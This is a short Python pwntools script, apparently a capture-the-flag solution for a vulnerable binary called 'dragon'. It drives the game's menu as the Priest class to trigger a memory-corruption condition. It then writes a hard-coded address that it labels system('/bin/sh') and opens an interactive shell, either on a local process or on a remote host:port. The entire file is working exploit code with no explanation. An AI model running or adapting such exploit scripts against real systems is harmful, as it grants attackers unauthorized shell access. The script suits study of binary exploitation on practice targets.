from pwn import *
context(os="linux", arch="i386", kernel="amd64")

if args.DEBUG:
    context.log_level="debug"

g_fname = args.FNAME if args.FNAME else './dragon'

if (args.REMOTE):
    host, port = args.REMOTE.split(':')
    g_io = remote(host, int(port))
else:
    g_io = process(g_fname)

def chose_priest():
    g_io.sendlineafter(b'Knight\n', b'1')

def preist_opt(idx):
    g_io.sendlineafter(b'Invincible.\n', str(idx).encode())

def pwn():
    # system("/bin/sh")
    addr_shell = 0x08048DBF
    chose_priest()
    preist_opt(1)
    preist_opt(1) # defeated by Baby dragon

    chose_priest()
    for i in range(4):
        preist_opt(3)
        preist_opt(3)
        preist_opt(2)
    
    g_io.send(p32(addr_shell).ljust(16, b'\0'))


if ('__main__' == __name__):
    pwn()
    g_io.interactive()